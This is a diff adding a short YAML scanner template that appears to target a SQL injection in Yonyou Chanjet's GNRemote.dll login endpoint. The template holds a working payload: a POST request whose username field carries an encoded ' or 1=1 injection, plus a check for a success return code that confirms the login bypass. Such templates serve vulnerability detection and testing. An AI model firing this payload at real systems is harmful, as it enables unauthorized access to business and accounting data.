@@ -1,0 +1,10 @@
+name: yongyou-chanjet-gnremote-sql-inject
+rules:
+  - method: POST
+    path: "/GNRemote.dll?GNFunction=LoginServer&decorator=text_wrap&frombrowser=esl"
+    body: |
+      username=%22'%20or%201%3d1%3b%22&password=%018d8cbc8bfc24f018&ClientStatus=1
+    expression: |
+      response.status == 200 && '"RetCode":(\\s*?)0'.bmatches(response.body)
+detail:
+  author: 666
